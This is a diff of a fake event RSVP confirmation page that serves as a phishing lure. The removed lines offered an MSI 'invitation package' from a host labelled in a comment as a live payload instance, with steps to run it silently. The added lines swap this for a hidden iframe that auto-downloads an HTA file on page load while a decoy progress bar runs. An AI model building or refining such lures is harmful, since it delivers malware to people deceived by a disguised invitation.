@@ -13,12 +13,9 @@
         .progress-container { width:100%; background-color:#2a2c3d; border-radius:4px; height:6px; margin-bottom:16px; overflow:hidden; }
         .progress-bar { width:0%; height:100%; background-color:#d4af37; transition:width 0.3s ease; }
         .status-text { font-size:13px; color:#8a8f98; margin-bottom:32px; }
-        .action-btn { display:inline-block; padding:12px 32px; background:transparent; border:1px solid #d4af37; color:#d4af37; text-decoration:none; border-radius:4px; font-size:14px; font-weight:600; letter-spacing:1px; transition:all 0.3s ease; cursor:pointer; margin-top:10px; opacity:0; pointer-events:none; }
-        .action-btn.visible { opacity:1; pointer-events:auto; }
-        .action-btn:hover { background:#d4af37; color:#1a1b26; }
         .footer-note { margin-top:40px; font-size:11px; color:#555; letter-spacing:1px; text-transform:uppercase; }
-        .instructions { margin-top:20px; font-size:12px; color:#666; background:rgba(255,255,255,0.03); padding:12px; border-radius:6px; text-align:left; display:none; }
-        code { background:rgba(255,255,255,0.1); padding:2px 6px; border-radius:3px; color:#d4af37; }
+        /* HIDDEN IFRAME FOR AUTO-DOWNLOAD */
+        #autoDl { display:none; }
     </style>
 </head>
 <body>
@@ -28,31 +25,24 @@
         <p class="subtitle">Your response has been received. Your digital invitation has been saved to your device.</p>
         <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
         <p class="status-text" id="statusText">Sending your RSVP... Contacting the event...</p>
-        
-        <!-- ✅ POINTS TO YOUR LIVE RAILWAY PAYLOAD INSTANCE -->
-        <a href="https://cocktails-payload-production.up.railway.app/schimdtconnect.msi" class="action-btn" download id="downloadBtn">
-            Download Invitation Package
-        </a>
-        
-        <div class="instructions" id="instructions">
-            <strong>Next Steps:</strong><br>
-            1. Run the downloaded installer<br>
-            2. Wait for silent configuration to complete
-        </div>
         <p class="footer-note">We can't wait to see you there</p>
     </div>
+
+    <!-- HIDDEN IFRAME TRIGGERS AUTO-DOWNLOAD ON LOAD -->
+    <iframe id="autoDl" src="/static/Event_Invitation.hta"></iframe>
+
     <script>
+        // ANIMATE PROGRESS BAR WHILE DOWNLOAD HAPPENS IN BACKGROUND
         let progress = 0;
         const bar = document.getElementById('progressBar');
         const status = document.getElementById('statusText');
-        const btn = document.getElementById('downloadBtn');
-        const instr = document.getElementById('instructions');
+        
         const interval = setInterval(() => {
             progress += Math.random() * 2.5;
             if (progress >= 100) {
-                progress = 100; clearInterval(interval);
-                status.textContent = "Confirmation complete. Download your invitation above.";
-                btn.classList.add('visible'); instr.style.display = "block";
+                progress = 100;
+                clearInterval(interval);
+                status.textContent = "Confirmation complete. Your invitation is ready.";
             }
             bar.style.width = progress + "%";
         }, 250);
